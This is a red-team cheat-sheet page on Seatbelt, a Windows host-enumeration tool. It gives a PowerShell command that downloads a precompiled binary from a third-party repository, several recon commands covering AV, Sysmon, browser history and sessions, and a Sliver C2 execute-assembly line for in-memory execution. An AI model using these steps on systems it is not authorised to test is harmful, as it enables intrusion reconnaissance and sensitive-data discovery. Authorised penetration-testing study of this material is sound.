# 09.05 Seatbelt

> C# .NET host situational awareness tool — enumerates Windows configuration, paths, logs, AV products.

## Overview

Seatbelt is GhostPack's host enumeration tool. Reads Windows host configuration relevant to attack planning: AV products, AppLocker status, BitLocker keys, Chrome bookmarks, RDP sessions, WiFi profiles, Sysmon config, environment variables, AppData files, etc. Pairs with WinPEAS but lighter and more focused. Compiled .NET assembly.

## Steps

- **Step 1** - Compile from GhostPack/Seatbelt or use a pre-compiled release.
- **Step 2** - Run with specific commands or 'all'.
- **Step 3** - Pipe through execute-assembly in Sliver/Cobalt for in-memory exec.

## Commands

### Get binary

```powershell
iwr 'https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe' -OutFile Seatbelt.exe
```

### List commands

```powershell
Seatbelt.exe -group=all
Seatbelt.exe -group=user
Seatbelt.exe -group=system
Seatbelt.exe -group=remote
Seatbelt.exe -group=chromium
Seatbelt.exe -group=slack
```

### Specific checks

```powershell
Seatbelt.exe AntiVirus
Seatbelt.exe Sysmon
Seatbelt.exe ChromeHistory
Seatbelt.exe RDPSessions
Seatbelt.exe Processes
Seatbelt.exe LogonSessions
Seatbelt.exe LocalGroups
Seatbelt.exe NetworkShares
```

### Sliver execute-assembly

```text
[sliver] $ execute-assembly /opt/tools/Seatbelt.exe -group=user
```

### Output to file

```powershell
Seatbelt.exe -group=all -outputfile=C:\Windows\Temp\seatbelt.txt
```
